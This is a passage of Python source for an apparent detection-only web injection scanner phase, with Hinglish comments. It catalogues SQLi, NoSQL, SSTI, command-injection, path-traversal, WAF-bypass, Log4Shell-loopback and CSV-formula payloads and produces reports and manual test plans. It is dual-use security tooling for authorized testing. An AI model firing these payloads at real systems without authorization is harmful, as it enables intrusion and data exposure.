    "csv_reflection": {"cwe": "CWE-1236", "owasp": "A03:2021-Injection"},
    "injection_surface_sparse": {"cwe": "-", "owasp": "-"},
    "baseline_unstable": {"cwe": "-", "owasp": "-"},
    "header_reflection_log": {"cwe": "CWE-117", "owasp": "A09:2021-Security Logging and Monitoring Failures"},
}

TECHNIQUE_CATALOG = [
    ("C", "Error-based SQLi", "quote variants (', \", %27, \\)", "6-DB error fingerprint (MySQL/Pg/MSSQL/SQLite/Oracle/ORM)", "CWE-89", "tamper scripts M se milegi"),
    ("C", "JSON-body SQLi", "{\"q\":\"'\"}", "same error family, JSON content-type", "CWE-89", "content-type switch bypass"),
    ("D", "Boolean SQLi", "' AND '1'='1 / ' AND '1'='2", "paired-diff oracle (true~base, false differs)", "CWE-89", "soft-404 guard applied"),
    ("E", "Time-based SQLi", "SLEEP(3)/pg_sleep/WAITFOR/DBMS_PIPE", "baseline-relative timing z-check", "CWE-89", "double-counted budget, hard cap"),
    ("F", "NoSQL operator", "?q[$ne]= / {\"$gt\":\"\"} / $regex .* / $where 1==1", "Mongo/BSON error fingerprint", "CWE-943", "login-bypass probe RoE-gated OFF"),
    ("G", "SSTI polyglot", "{{7*7}} ${7*7} [[${7*7}]] {7*7} <%= %> #{ } *{ }", "49/7777777 arithmetic render + engine tag", "CWE-1336", "RCE payload KABHI nahi"),
    ("H", "Command injection", ";id |id $(id) `id` %0aid %09id ;/usr/bin/id", "uid=/gid= fingerprint (+bounded timing)", "CWE-78", "sirf harmless id"),
    ("I", "Path traversal ladder", "../../../ ..;/ %2e%2e %252e %c0%af ....// // /./ php://filter file://", "passwd/win.ini safe markers + winning variant", "CWE-22", "read-only, NO writes"),
    ("J", "Open redirect", "// \\/\\/ /// https: %2F%2F userinfo subdir-spoof", "302/301 Location canary, follow-never", "CWE-601", "canary=example.com only"),
    ("K", "CRLF injection", "%0d%0aHeader: v / Set-Cookie", "injected header echo / split", "CWE-113", "response-splitting demo nahi"),
    ("L", "HPP", "p=A&p=B vs p=B&p=A", "precedence diff = WAF/backend desync", "CWE-235", "famous chain entry"),
    ("M", "WAF shaping", "%2527 %EF%BC%87 %u0027 /*!50000 */ %5C%27 \\u0027 AnD", "blocked->bypassed encode ladder", "CWE-89", "winning variant = proof"),
    ("N", "GraphQL", "string-arg quote, numeric flip, __typename liveness", "did-you-mean / error mining (query-only)", "CWE-943", "mutation/subscription KABHI"),
    ("O", "Deser/type-confusion", "p[] / p[$ne] / json-in-string / type flips", "PHP/Java/Python/.NET deser fingerprints", "CWE-502", "gadget payload KABHI"),
    ("S", "Header injection", "X-Forwarded-For: ' / Referer / UA", "DB-error via log pipeline + echo", "CWE-89", "internal sinks headers me"),
    ("T", "Prototype pollution", "__proto__[k]=v + constructor[prototype][k]=v (GET+JSON)", "merged-key echo / PP error", "CWE-1321", "gadget hunt P13/P20"),
    ("U", "XXE canary", "internal entity <!ENTITY waspE \"..\"> + &waspE;", "RESOLVED echo = entity processing ON", "CWE-611", "external/file XXE P15 RoE-gated"),
    ("V", "EL refine", "${7*7}=49 + {{7*7}} control", "dollar-only eval = java-el/spel", "CWE-917", "RCE-class, proof arithmetic-tak"),
    ("V", "Log4Shell (GATED)", "${jndi:ldap://127.0.0.1:1/..} + obfuscated forms", "log4j/jndi/ldap error fingerprints", "CWE-917", "DEFAULT OFF, loopback-only, zero egress"),
    ("W", "CSV formula", "=canary +canary @SUM(canary)", "unescaped cell reflection in CSV", "CWE-1236", "victim-side chain, test-rows only"),
]


def build_catalog_md():
    lines = [
        "# Phase 12 - TECHNIQUES CATALOG (v%s)" % PLAN_VERSION,
        "",
        "Har stage ka technique -> payload -> expected signal -> OWASP/CWE mapping.",
        "Detection-only: har payload ka exploitation boundary note me hai.",
        "",
        "| St | Technique | Sample Payload | Expected Signal | CWE | Boundary/Bypass Note |",
        "|----|-----------|----------------|-----------------|-----|----------------------|",
    ]
    for st, tech, pay, sig, cwe, note in TECHNIQUE_CATALOG:
        lines.append("| %s | %s | `%s` | %s | %s | %s |"
                     % (st, tech, pay.replace("|", "\\|"), sig, cwe, note))
    lines += [
        "",
        "## Verdict classes",
        "",
        "- CONFIRMED: deterministic fingerprint baseline me nahi tha",
        "- SUSPECTED: single behavioral signal (manual verify)",
        "- WAF_BLOCKED: block-layer ne roka (finding nahi, stage-M input)",
        "- NOISE: baseline unstable; SAFE: koi signal nahi",
        "",
        "Machine-readable mapping: `cwe_owasp_map.json`.",
    ]
    return "\n".join(lines)


def reflection_map(ctx, conf):
    """Stage P (0 requests): sab captures se param->context XSS-ripe table."""
    out = []
    seen = set()
    marker_map = {}   # payload marker -> (url, param)
    # capture() me payload pura store hota hai; unique suffix markers bhi
    for cap in ctx.get("captures", []):
        payload = cap.get("payload") or ""
        url, param = cap.get("url", ""), cap.get("param", "")
        txt = cap.get("text", "")
        # reflection check: payload ka distinctive chunk (pehle 24 chars, safe cut)
        chunk = payload.strip()[:24]
        if not chunk or len(chunk) < 6:
            continue
        ctxname, verbatim = reflection_context(txt, chunk)
        if not ctxname:
            continue
        key = (url.split("?")[0], param, ctxname)
        if key in seen:
            continue
        seen.add(key)
        out.append({"url": url, "param": param, "context": ctxname,
                    "verbatim": verbatim, "payload_probe": chunk,
                    "status": cap.get("status"),
                    "next_phase": "P13-XSS" if verbatim else "P13-encoded-review",
                    "suggested": {
                        "html-body": "<svg/onload=... (P13 context-tested)",
                        "inside-tag": "event-handler breakout (P13)",
                        "html-attr": "attr-quote breakout (P13)",
                        "js-string": "js-string breakout \\'; (P13)",
                        "header": "header-reflect abuse (P14)",
                        "encoded": "encoding-aware bypass (P13)",
                        "html-encoded": "entity-encode bypass (P13)",
                    }.get(ctxname, "manual (P13)")})
    out.sort(key=lambda r: (0 if r["verbatim"] else 1, -r["status"] or 0))
    return out


# ===========================================================================
# STAGE Q/R: HYPOTHESES + FEEDFORWARD + REPORTS
# ===========================================================================
_CLASS_STEPS = {
    "sqli": "1) Baseline payload pair manual Repeater me (AND 1=1 / 1=2); "
            "2) DBMS confirm: quote par error family padho; "
            "3) sqlmap --level=2 --risk=1 --batch (SIRF RoE written allow par); "
            "4) dump RoE-gated - nahi to detection-proof + version() tak hi.",
    "nosql": "1) Operator payload GET/JSON form me ([$ne]/{$ne}); "
             "2) login par SIRF apne test accounts; 3) $regex char-by-char "
             "SIRF bounded test-account data par; 4) fix-suggestion: operator "
             "whitelist + type-cast.",
    "ssti": "1) Engine tag matrix se identify (49 vs 7777777); "
            "2) engine-specific math probe ({{7*'7'}} Jinja2); "
            "3) RCE payloads SIRF lab; production = arithmetic proof report.",
    "cmdi": "1) ;id / |id / $(id) form me; 2) blind case me timing sleep "
            "(bounded); 3) RCE ke aage RoE gate - reverse shell KABHI nahi; "
            "4) fix: allowlist + shell=False.",
    "file": "1) Traversal ladder variants (proof me winning variant hai); "
            "2) known safe markers (passwd/win.ini); 3) config/creds file NAMES "
            "hypothesis me - contents extract nahi karo; 4) LFI-to-RCE sirf "
            "hypothesis.",
    "redirect": "1) Canary variants (proof me variant); 2) OAuth redirect_uri "
                "same variant (P21); 3) client-side case me DOM sink (P14).",
    "crlf": "1) %0d%0a header-injection marker; 2) cache-poisoning chain "
            "(P26 layer); 3) session-fixation demo apne accounts par.",
    "hpp": "1) A,B / B,A order matrix manual; 2) WAF-vs-backend parser diff "
           "confirm; 3) access-control params par (P11 matrix targets).",
    "deser": "1) Fingerprint se framework identify; 2) gadget payload KABHI "
             "nahi (RoE); 3) ysoserial-type analysis SIRF lab; report me "
             "hypothesis likho.",
    "gql": "1) did-you-mean se hidden fields map; 2) string-arg quote confusion; "
           "3) batching/alias probe (P11 ULTRA L stage ka pattern).",
}


def build_hypotheses(ctx, conf, meta, results_by_stage, ranked):
    """Manual test plan ka ranked hypothesis list (evidence-first)."""
    confirmed_keys = set()
    for rec in (results_by_stage.get("error_sqli", {}).get("records", []) +
                results_by_stage.get("boolean_sqli", {}).get("records", []) +
                results_by_stage.get("time_sqli", {}).get("records", [])):
        if rec.get("verdict") == "CONFIRMED":
            confirmed_keys.add((rec["url"].split("?")[0], rec["param"]))
    hyps = []
    for t in ranked:
        url, param = t["url"], t["param"]
        done = (url.split("?")[0], param) in confirmed_keys
        for fam in t.get("families", []):
            steps = _CLASS_STEPS.get(fam)
            if not steps:
                continue
            hyps.append({
                "url": url, "param": param, "class": fam,
                "status": "CONFIRMED-AUTO (proof ready)" if done
                          else "HYPOTHESIS (manual follow-up)",
                "evidence_sources": t.get("sources", []),
                "manual_steps": steps,
                "kab": "P12 auto-run ke turant baad, isi engagement me",
                "kahan_se": "Burp Repeater (raw requests evidence/ folder me hain)",
            })
    blocked = ctx.get("waf_blocked", [])
    if blocked:
        hyps.append({
            "url": blocked[0].get("url", ""), "param": "multiple",
            "class": "waf-shape", "status": "WAF_BLOCKED inputs -> stage M input",
            "manual_steps": "Blocked payload + winning encode variant (waf_bypass.json "
                            "me) ko Burp Intruder single-payload mode me rakho; "
                            "tamper-script mapping likho.",
            "kab": "Stage M ke baad", "kahan_se": "waf_bypass.json"})
    hyps.sort(key=lambda h: (0 if "CONFIRMED-AUTO" in h["status"] else 1, h["class"]))
    return hyps[:60]


def _matrix_rows(ranked, results_by_stage):
    """target x class verdict matrix."""
    stage_class = {
        "error_sqli": "sqli", "boolean_sqli": "sqli", "time_sqli": "sqli",
        "nosql_injection": "nosql", "ssti_scan": "ssti", "cmdi_scan": "cmdi",
        "traversal_scan": "file", "redirect_scan": "redirect",
        "crlf_scan": "crlf", "hpp_scan": "hpp", "waf_bypass": "waf-shape",
        "deser_scan": "deser",
        "header_inject_scan": "header", "proto_pollution_scan": "proto",
        "xxe_canary_scan": "xxe", "el_log4shell_scan": "el",
        "csv_inject_scan": "csv",
    }
    rows = {}
    for t in ranked:
        rows[(t["url"].split("?")[0], t["param"])] = {
            "url": t["url"], "param": t["param"], "sources": t.get("sources", []),
            "verdicts": {}}
    for stage, cls in stage_class.items():
        for rec in results_by_stage.get(stage, {}).get("records", []):
            k = (rec.get("url", "").split("?")[0], rec.get("param"))
            if k not in rows:
                rows[k] = {"url": rec.get("url", ""), "param": rec.get("param"),
                           "sources": ["probe"], "verdicts": {}}
            rows[k]["verdicts"][cls] = rec.get("verdict", "SAFE")
    return [rows[k] for k in rows]


def _chains_text(F):
    keys = {f["key"] for f in F.items}
    out = ["WASP Phase 12 - injection attack chains (evidence -> next move)",
           "=" * 72, ""]
    for ch in CHAIN_HINTS:
        when = ch["when"]
        if any(k in keys for k in when.split("|")):
            out.append("[TRIGGER] %s" % when)
            out.append("  THEN : %s" % ch["then"])
            out.append("  IMPACT: %s" % ch["impact"])
            out.append("")
    if len(out) <= 3:
        out.append("(koi confirmed injection chain trigger nahi hua - "
                   "hypotheses injection_hypotheses.json me hain)")
    return "\n".join(out)


def _findings_md(F, conf, meta):
    lines = [
        "# Phase 12 - Injection Findings (v%s)" % PLAN_VERSION, "",
        "Target: `%s`" % meta.get("origin", "-"),
        "Generated: %s | Mode: detection-only (RoE-bounded)" % now_iso(), "",
        "| # | Sev | Key | Endpoint | Title |", "|---|-----|-----|----------|-------|",
    ]
    for f in F.items:
        lines.append("| %s | **%s** | `%s` | %s | %s |"
                     % (f["id"], f["severity"], f["key"], f["endpoint"][:90],
                        f["title"][:80]))
    lines.append("")
    lines.append("## Kya karna hai (1-line per finding)")
    for f in F.items:
        lines.append("- **%s %s** -> %s" % (f["id"], f["key"],
                                            (f.get("why_it_matters") or "")[:200]))
    lines.append("")
    lines.append("> RoE reminder: detection-only run tha. Dump/RCE/gadget payloads "
                 "sirf RoE written-allow par. Har finding ka raw request/response "
                 "`evidence/` folder me hai (PII redacted).")
    return "\n".join(lines)


def _test_plan_md(hyps, conf, meta):
    lines = [
        "# Phase 12 - Injection Test Plan (manual follow-up guide)", "",
        "Fundaa: **blind fuzzer nahi** - sirf evidence-backed params (runbook §10).",
        "Auto-run budget: error=%d boolean=%d time=%d (hard-capped)" % (
            conf.get("inject_error_probes", 24), conf.get("inject_boolean_probes", 16),
            conf.get("inject_time_probes", 6)), "",
        "## Ranked hypotheses (CONFIRMED-AUTO pehle, phir manual queue)",
        "",
    ]
    for i, h in enumerate(hyps, 1):
        lines.append("### %d. %s [%s] - %s" % (i, h["param"], h["class"], h["status"]))
        lines.append("- URL: `%s`" % h["url"][:140])
        lines.append("- KAB: %s" % h.get("kab", "-"))
        lines.append("- KAHAN SE: %s" % h.get("kahan_se", "-"))
        lines.append("- KAISE: %s" % h.get("manual_steps", "-"))
        lines.append("")
    lines.append("## Report template per finding")
    lines.append("1. Request pair (baseline + probe) evidence/ se")
    lines.append("2. 1-line explanation (konsa fingerprint, kyun true-positive)")
    lines.append("3. Impact sentence (chain hints injection_chains.txt se)")
    lines.append("4. Fix suggestion (param-level + framework-level)")
    return "\n".join(lines)


def write_reports(out, scope, F, ctx, meta, results_by_stage, hypotheses, ranked, conf):
    """Stage R: sab result files (RWX-guaranteed) + MANIFEST."""
    # -- surface files
    _rwx_save_json(os.path.join(out, "inject_surface.json"),
                   {"meta": meta, "targets": ranked})
    _rwx_save_text(os.path.join(out, "inject_targets.txt"),
                   "\n".join("%-4s %-22s %-16s ev=%.2f  %s"
                             % (t.get("rank"), t["param"], ",".join(t.get("families", [])),
                                t.get("evidence", 0.0), t["url"]) for t in ranked))
    _rwx_save_json(os.path.join(out, "waf_map.json"), meta.get("waf_map", []))
    # -- per-stage result files
    stage_files = {
        "error_sqli": "error_sqli.json", "boolean_sqli": "boolean_sqli.json",
        "time_sqli": "time_sqli.json", "nosql_injection": "nosql_injection.json",
        "ssti_scan": "ssti_scan.json", "cmdi_scan": "cmdi_scan.json",
        "traversal_scan": "traversal_scan.json", "redirect_scan": "redirect_scan.json",
        "crlf_scan": "crlf_scan.json", "hpp_scan": "hpp_scan.json",
        "waf_shape_ultra": "waf_bypass.json", "graphql_inject": "gql_inject.json",
        "deser_typeflip": "deser_scan.json",
        "header_inject_scan": "header_inject.json",
        "proto_pollution_scan": "proto_pollution.json",
        "xxe_canary_scan": "xxe_canary.json",
        "el_log4shell_scan": "el_log4shell.json",
        "csv_inject_scan": "csv_inject.json",
    }
    for stage, fname in stage_files.items():
        res = results_by_stage.get(stage) or {"records": [], "stats": {}}
        _rwx_save_json(os.path.join(out, fname), res)
    # -- matrix
    rows = _matrix_rows(ranked, results_by_stage)
    _rwx_save_json(os.path.join(out, "injection_matrix.json"), {"rows": rows})
    mtxt = ["%-10s %-18s %-9s %-9s %-9s %-9s %-9s %-9s" % (
        "TARGET", "PARAM", "SQLi", "NoSQL", "SSTI", "CMDI", "FILE", "OTHER"), "-" * 100]
    for r in rows:
        v = r["verdicts"]
        short = lambda x: {"CONFIRMED": "CONFIRM", "SUSPECTED": "SUSPECT",
                           "WAF_BLOCKED": "WAF-BLK", "NOISE": "NOISE",
                           "SAFE": "-"}.get(x, x or "-")
        mtxt.append("%-10s %-18s %-9s %-9s %-9s %-9s %-9s %-9s" % (
            (r["url"].split("?")[0] or "-").split("//")[-1][:10], r["param"][:18],
            short(v.get("sqli")), short(v.get("nosql")), short(v.get("ssti")),
            short(v.get("cmdi")), short(v.get("file")),
            short(v.get("redirect") or v.get("crlf") or v.get("hpp")
                  or v.get("deser") or v.get("waf-shape") or v.get("header")
                  or v.get("proto") or v.get("xxe") or v.get("el")
                  or v.get("csv"))))
    _rwx_save_text(os.path.join(out, "injection_matrix.txt"), "\n".join(mtxt))
    # -- reflection map (stage P)
    refl = ctx.get("reflection_out") or []
    _rwx_save_json(os.path.join(out, "reflection_map.json"),
                   {"params": refl, "note": "capture-based (0 extra requests)"})
    # -- hypotheses
    _rwx_save_json(os.path.join(out, "injection_hypotheses.json"),
                   {"hypotheses": hypotheses, "count": len(hypotheses)})
    # -- docs
    _rwx_save_text(os.path.join(out, "INJECTION_FINDINGS.md"), _findings_md(F, conf, meta))
    _rwx_save_text(os.path.join(out, "injection_test_plan.md"), _test_plan_md(hypotheses, conf, meta))
    _rwx_save_text(os.path.join(out, "injection_chains.txt"), _chains_text(F))
    # -- v13 full-detail catalog + CWE/OWASP map
    _rwx_save_text(os.path.join(out, "TECHNIQUES_CATALOG.md"), build_catalog_md())
    _rwx_save_json(os.path.join(out, "cwe_owasp_map.json"), CWE_OWASP_MAP)
    # -- findings.json (standard shape)
    _rwx_save_json(os.path.join(out, "findings.json"),
                   {"module": NAME, "phase": PHASE, "version": PLAN_VERSION,
                    "count": len(F.items), "findings": F.items,
                    "generated": now_iso()})
    # -- feedforward
    refl_ripe = [r for r in refl if r.get("verbatim")][:15]
    confirmed_redirects = [r for r in results_by_stage.get("redirect_scan", {})
                          .get("records", []) if r.get("verdict") == "CONFIRMED"]
    client_redirects = [r for r in results_by_stage.get("redirect_scan", {})
                        .get("records", []) if r.get("verdict") == "SUSPECTED"]
    sqli_conf = [r["url"] for r in (results_by_stage.get("error_sqli", {}).get("records", []) +
                                    results_by_stage.get("boolean_sqli", {}).get("records", []) +
                                    results_by_stage.get("time_sqli", {}).get("records", []))
                 if r.get("verdict") == "CONFIRMED"]
    write_feedforward(out, PHASE, {
        "to_phase13_xss": {"xss_ripe": refl_ripe,
                           "note": "verbatim-reflect params + context - blind scan nahi"},
        "to_phase14_redirect": {"confirmed": confirmed_redirects[:8],
                                "client_side": client_redirects[:8]},
        "to_phase17_api": {"matrix_rows": len(rows),
                           "confirmed_injections": len(sqli_conf)},
        "to_phase20_logic": {"sqli_confirmed": sqli_conf[:8],
                             "deser_hints": [r["url"] for r in results_by_stage
                                             .get("deser_typeflip", {}).get("records", [])
                                             if r.get("verdict") == "CONFIRMED"]},
        "to_phase21_authz": {"redirect_oauth_targets": confirmed_redirects[:5],
                             "note": "redirect_uri variants wahi use karo"},
        "to_phase23": {"hpp_params": [r["param"] for r in results_by_stage
                                     .get("hpp_scan", {}).get("records", [])],
                       "log4shell_hints": [r["url"] for r in results_by_stage
                                           .get("el_log4shell_scan", {}).get("records", [])
                                           if r.get("verdict") == "CONFIRMED"]},
        "to_phase15_ssrf": {"redirect_targets": [r["url"] for r in results_by_stage
                                                 .get("redirect_scan", {}).get("records", [])],
                            "xxe_ready": [r["url"] for r in results_by_stage
                                          .get("xxe_canary_scan", {}).get("records", [])
                                          if r.get("verdict") in ("CONFIRMED", "SUSPECTED")],
                            "note": "external-entity/file-read probes P15 me, RoE-gated"},
        "to_phase16_files": {"traversal_confirmed": [r["url"] for r in results_by_stage
                                                     .get("traversal_scan", {}).get("records", [])
                                                     if r.get("verdict") == "CONFIRMED"],
                             "winning_variants": [r.get("winning_variant") for r in results_by_stage
                                                  .get("traversal_scan", {}).get("records", [])
                                                  if r.get("winning_variant")]},
        "to_phase18_graphql": {"gql_records": len(results_by_stage
                                                   .get("graphql_inject", {}).get("records", [])),
                               "note": "P11 gql engine + P6 introspection ke saath"},
        "to_phase26_cache": {"crlf_confirmed": [r["url"] for r in results_by_stage
                                                .get("crlf_scan", {}).get("records", [])
                                                if r.get("verdict") == "CONFIRMED"],
                             "note": "cache-poisoning chain entry points"},
        "to_phase32_report": {"findings": len(F.items),
                              "by_severity": _sev_counts(F)}},
        notes=["detection-only run - dumps/RCE/gadgets RoE-gated",
               "evidence PII-redacted; raw captures evidence/requests.jsonl me"])
    # -- MANIFEST
    files = ["inject_surface.json", "inject_targets.txt", "waf_map.json",
             "injection_matrix.json", "injection_matrix.txt",
             "reflection_map.json", "injection_hypotheses.json",
             "INJECTION_FINDINGS.md", "injection_test_plan.md",
             "injection_chains.txt", "TECHNIQUES_CATALOG.md", "cwe_owasp_map.json",
             "findings.json", "feedforward.json"] + \
        list(stage_files.values())
    write_manifest(out, PHASE, files,
                   stats={"targets": len(ranked), "probes_total": meta.get("probes_total", 0),
                          "findings": len(F.items),
                          "waf_map": len(meta.get("waf_map", []))})
    _rwx_tree(out)


def _sev_counts(F):
    counts = {}
    for f in F.items:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    return counts


# ===========================================================================
# MAIN RUN (stages A->R wiring, passive mode, resume-safe)
# ===========================================================================
def run(cfg, scope, base_out):
    t_start = time.time()
    out, ev, http, cp = module_ctx(cfg, scope, base_out, NAME)
    conf = dict(DEFAULTS)
    for k in list(conf.keys()):
        if hasattr(cfg, k):
            conf[k] = getattr(cfg, k)

    head("Phase 12 - Injection (detection-only) (v%s) | %s" % (PLAN_VERSION, scope.describe()))
    if conf.get("inject_nosql_login_probe"):
        warn("NoSQL LOGIN-bypass probe ON (inject_nosql_login_probe=true) - SIRF apne "
             "test accounts par. RoE check karo.")
    if conf.get("inject_cmdi_timing"):
        warn("CMDI blind-timing probes ON - har hit ~4s delay paida karta hai (bounded).")
    if conf.get("inject_allow_time_based", True):
        info("Time-based SQLi ON, cap=%s (expensive, double-counted)" %
             conf.get("inject_time_probes"))
    if conf.get("inject_allow_log4shell", False):
        warn("Log4Shell jndi probes ON - LOOPBACK-ONLY (127.0.0.1) payloads, "
             "par bhi RoE me written allow confirm karo (default OFF hai).")

    F = Findings()
    ctx = {"captures": [], "confirmed": set(), "waf_blocked": [],
           "base_dir": os.path.join(base_out, scope.engagement), "coverage": {}}
    meta = {"waf_probes_used": 0, "probes_total": 0}

    # ---------------- Stage A: discovery ----------------
    head("Stage A - Injection surface discovery (P4-P11 mining, evidence-ranked)")
    ckA = "stageA:discovery"
    if cp.is_done(ckA):
        cached = cp.result_of(ckA) or ([], {})
        ranked, disc_meta = cached[0], cached[1]
        ok("Replayed %d targets (checkpoint)" % len(ranked))
    else:
        ranked, disc_meta = discover_inject_surface(base_out, scope, conf)
        cp.mark(ckA, [ranked, disc_meta], summary="inject surface")
    if not ranked:
        err("Koi injection target nahi mila. P2-P11 pehle chalao ya scope.json check karo.")
        ctx["coverage"]["surface"] = "NOT-FOUND"
        write_reports(out, scope, F, ctx, meta, {}, [], [], conf)
        return out
    ok("%d injection targets (evidence-ranked)" % len(ranked))
    ctx["ranked"] = ranked
    meta["total_mined"] = disc_meta.get("total_mined", 0)
    if len(ranked) < 3:
        F.add("injection_surface_sparse", "Injection surface chhota hai",
              scope.describe(), "sirf %d evidence-backed target(s) mile - P5/P7/P8 "
              "deeper chalao ya manual Burp map import karo." % len(ranked),
              evidence_ref="inject_surface.json")

    # ---------------- PASSIVE MODE ----------------
    if not getattr(cfg, "allow_active", True):
        warn("allow_active=False -> PASSIVE mode: discovery + offline hypotheses "
             "(0 network probes).")
        hyps = build_hypotheses(ctx, conf, meta, {}, ranked)
        ctx["coverage"]["passive"] = "%d targets, %d hypotheses" % (len(ranked), len(hyps))
        write_reports(out, scope, F, ctx, meta, {}, hyps, ranked, conf)
        write_feedforward(out, PHASE, {"to_phase32_report": {"mode": "passive"}},
                          notes=["allow_active=false -> 0-probe passive run"])
        write_manifest(out, PHASE, ["inject_surface.json", "inject_targets.txt",
                                    "injection_hypotheses.json", "findings.json",
                                    "feedforward.json", "injection_test_plan.md"],
                       stats={"mode": "passive", "targets": len(ranked),
                              "hypotheses": len(hyps)})
        _rwx_tree(out)
        return out

    # ---------------- Stage B: calibration ----------------
    head("Stage B - Baseline & WAF calibration")
    first_origin = "{0.scheme}://{0.netloc}".format(urllib.parse.urlsplit(ranked[0]["url"]))
    meta["origin"] = first_origin
    meta["soft404"] = soft404_for_origin(http, ranked[0]["url"], conf, cp)
    waf_map = []
    seen_ep = set()
    for t in ranked:
        ep = t["url"].split("?")[0]
        if ep in seen_ep or len(waf_map) >= int(conf.get("inject_waf_probe_budget", 6)):
            continue
        seen_ep.add(ep)
        w = waf_detect(http, t["url"], t["param"], conf, cp, meta)
        if w:
            waf_map.append(w)
    meta["waf_map"] = waf_map
    n_waf = len([w for w in waf_map if w.get("waf")])
    ok("calibration: %d endpoint(s) WAF-mapped, %d block-layer detect hua"
       % (len(waf_map), n_waf))
    for w in waf_map:
        if w.get("waf"):
            F.add("waf_detected", "WAF/block-layer: %s" % w["waf"],
                  w["url"], "Fingerprint: %s" % w.get("snippet", ""),
                  evidence_ref="waf_map.json")

    results_by_stage = {}

    # ---------------- Stage C: error SQLi ----------------
    head("Stage C - Error-based SQLi (DB-error fingerprints)")
    results_by_stage["error_sqli"] = error_sqli(http, scope, F, ctx, conf, ranked, meta, cp)

    # ---------------- Stage D: boolean SQLi ----------------
    head("Stage D - Boolean-based SQLi (paired oracle)")
    results_by_stage["boolean_sqli"] = boolean_sqli(http, scope, F, ctx, conf, ranked, meta, cp)

    # WAF-blocked inputs collect (stage M input) - FIX-2
    for st in ("error_sqli", "boolean_sqli"):
        for rec in results_by_stage.get(st, {}).get("records", []):
            if rec.get("verdict") == "WAF_BLOCKED":
                ctx["waf_blocked"].append({
                    "url": rec["url"], "param": rec["param"],
                    "payload": (rec.get("signals") or [{}])[0].get("payload", "'"),
                    "from_stage": st})

    # ---------------- Stage E: time SQLi ----------------
    head("Stage E - Time-based SQLi (bounded, expensive)")
    results_by_stage["time_sqli"] = time_sqli(http, scope, F, ctx, conf, ranked, meta, cp)

    # ---------------- Stage F: NoSQL ----------------
    head("Stage F - NoSQL operator injection ($ne/$gt/$regex)")
    results_by_stage["nosql_injection"] = nosql_injection(http, scope, F, ctx, conf,
                                                          ranked, meta, cp)

    # ---------------- Stage G: SSTI ----------------
    head("Stage G - SSTI / template injection (arithmetic-proof only)")
    results_by_stage["ssti_scan"] = ssti_scan(http, scope, F, ctx, conf, ranked, meta, cp)

    # ---------------- Stage H: CMDI ----------------
    head("Stage H - Command injection (harmless id fingerprint%s)" %
         (" + blind timing" if conf.get("inject_cmdi_timing") else ""))
    results_by_stage["cmdi_scan"] = cmdi_scan(http, scope, F, ctx, conf, ranked, meta, cp)

    # ---------------- Stage I: traversal ----------------
    head("Stage I - Path traversal (read-only safe markers)")
    results_by_stage["traversal_scan"] = traversal_scan(http, scope, F, ctx, conf,
                                                        ranked, meta, cp)

    # ---------------- Stage J: redirect ----------------
    head("Stage J - Open redirect (canary discipline)")
    results_by_stage["redirect_scan"] = redirect_scan(http, scope, F, ctx, conf,
                                                      ranked, meta, cp)

    # ---------------- Stage K: CRLF ----------------
    head("Stage K - CRLF / header injection")
    results_by_stage["crlf_scan"] = crlf_scan(http, scope, F, ctx, conf, ranked, meta, cp)

    # ---------------- Stage L: HPP ----------------
    head("Stage L - HPP param pollution (precedence diff)")
    results_by_stage["hpp_scan"] = hpp_scan(http, scope, F, ctx, conf, ranked, meta, cp)

    # ---------------- Stage M: WAF shaping ----------------
    head("Stage M - WAF-aware payload shaping (encode variants)")
    results_by_stage["waf_shape_ultra"] = waf_shape_ultra(http, scope, F, ctx, conf,
                                                          ranked, meta, cp)

    # ---------------- Stage N: GraphQL ----------------
    head("Stage N - GraphQL injection surface (query-only)")
    results_by_stage["graphql_inject"] = graphql_inject(http, scope, F, ctx, conf,
                                                        ranked, meta, cp)

    # ---------------- Stage O: deser / type confusion ----------------
    head("Stage O - Type confusion & deser fingerprints (no gadgets)")
    results_by_stage["deser_typeflip"] = deser_typeflip(http, scope, F, ctx, conf,
                                                        ranked, meta, cp)

    # ---------------- Stage S: header-point injection (v13) ----------------
    head("Stage S - Header-point injection (XFF/Referer/UA sinks)")
    results_by_stage["header_inject_scan"] = header_inject_scan(http, scope, F, ctx,
                                                                conf, ranked, meta, cp)

    # ---------------- Stage T: prototype pollution (v13) ----------------
    head("Stage T - Server-side prototype pollution (bracket GET + JSON)")
    results_by_stage["proto_pollution_scan"] = proto_pollution_scan(http, scope, F, ctx,
                                                                    conf, ranked, meta, cp)

    # ---------------- Stage U: XXE canary (v13) ----------------
    head("Stage U - XXE internal-entity canary (no external/file entities)")
    results_by_stage["xxe_canary_scan"] = xxe_canary_scan(http, scope, F, ctx,
                                                          conf, ranked, meta, cp)

    # ---------------- Stage V: EL refine + Log4Shell gated (v13) ----------------
    head("Stage V - EL engine refine%s"
         % (" + Log4Shell jndi (RoE-gated, loopback-only)"
            if conf.get("inject_allow_log4shell", False) else ""))
    results_by_stage["el_log4shell_scan"] = el_log4shell_scan(http, scope, F, ctx,
                                                              conf, ranked, meta, cp)

    # ---------------- Stage W: CSV formula injection (v13) ----------------
    head("Stage W - CSV/formula injection (unescaped cell reflection)")
    results_by_stage["csv_inject_scan"] = csv_inject_scan(http, scope, F, ctx,
                                                          conf, ranked, meta, cp)

    # ---------------- Stage P: reflection map ----------------
    # FIX-4b: captures ko checkpoint-back karo - replay/resume par ctx["captures"]
    # in-memory khali hota hai (stages cache se aate hain, capture() nahi chalta)
    # -> reflection map + xss_ripe feedforward warna data kho dete hain.
    head("Stage P - Reflection map (0 extra requests, capture-based)")
    ckCaps = "captures:store"
    cached_caps = cp.result_of(ckCaps) if cp.is_done(ckCaps) else None
    if cached_caps and ctx.get("captures"):
        _seenk = set()
        _merged = []
        for _c in (list(cached_caps) + list(ctx["captures"])):
            _k = (_c.get("url"), _c.get("param"), _c.get("payload"), _c.get("note"))
            if _k not in _seenk:
                _seenk.add(_k)
                _merged.append(_c)
        ctx["captures"] = _merged[:900]
    elif cached_caps:
        ctx["captures"] = list(cached_caps)
    elif ctx.get("captures"):
        cp.mark(ckCaps, ctx["captures"], summary="captures %d" % len(ctx["captures"]))
    refl = reflection_map(ctx, conf) if conf.get("inject_reflection_map", True) else []
    ctx["reflection_out"] = refl
    for r in refl[:10]:
        if r.get("verbatim") and r.get("context") in ("html-body", "inside-tag",
                                                      "html-attr", "js-string"):
            F.add("reflection_xss_ripe", "Reflection ripe: %s [%s] -> %s"
                  % (r["param"], r["context"], r.get("suggested", "P13")),
                  r["url"], "probe %r reflected %s (P13 ka first target)"
                  % (r.get("payload_probe"), r["context"]),
                  evidence_ref="reflection_map.json")
    ok("reflection map: %d param-context(s)" % len(refl))

    # ---------------- Stage Q: hypotheses ----------------
